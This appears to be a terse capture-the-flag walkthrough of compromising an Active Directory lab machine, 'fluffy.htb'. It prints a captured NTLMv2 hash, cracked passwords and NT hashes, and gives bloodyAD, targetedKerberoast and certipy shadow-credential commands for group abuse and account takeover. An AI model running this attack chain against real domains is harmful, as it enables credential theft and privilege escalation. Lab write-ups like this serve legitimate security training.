j.fleischman / J0elTHEM4n1990!

the credentials allow to access a smb shared on which there is IT folder with read/write privilege. There is also a pdf listing CVE affecting machine inside the network, and one of this is a spoofing vuln exploited through ZIP decompressing. Using the poc and setting up responder give us an NLTM hash

p.agila::FLUFFY:f409ea4341c69333:6F91046041A5AD357030F1ABBF8DEC65:010100000000000080EF03274BCEDB01E3233C52945E272C00000000020008005700570031004F0001001E00570049004E002D004600460036005800480034004D004F0046005300460004003400570049004E002D004600460036005800480034004D004F004600530046002E005700570031004F002E004C004F00430041004C00030014005700570031004F002E004C004F00430041004C00050014005700570031004F002E004C004F00430041004C000700080080EF03274BCEDB0106000400020000000800300030000000000000000100000000200000959609CD9C3712794AE9826701BCA7C70676388E93DB60D3AE486DA95A12AE9F0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0032000000000000000000

cracking gives:

prometheusx-303  (p.agila) 

the user winrm_svc is in the Remote manager group

p.agila has generic all su service accounts which has generic write on winrm so first we add ourself to the group

`bloodyAD -d fluffy.htb --host 10.10.11.69 -u p.agila -p 'prometheusx-303' add groupMember 'Service Accounts' p.agila`

now bloodhound suggests a targetedKerberoasting exploiting the GenericWrite or Shadow Credentials attack:


`python3 /opt/tools/targetedKerberoast.py -v -d 'fluffy.htb' -u p.agila -p prometheusx-303 --request-user winrm_svc`

with the first one we obtain a ticket to crack
with the second one we obtain both the ticket and the NT hash
`certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p "prometheusx-303" -account 'winrm_svc' -dc-ip '10.10.11.69'`

winrm_svc :33bd09dcd697600edf6b3a7af4875767

having also generic write to ca_svc we do the same:
`certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p "prometheusx-303" -account 'ca_svc' -dc-ip '10.10.11.69'`

ca_svc :ca0f4f9e9eb8a092addf53bb03fc98c8
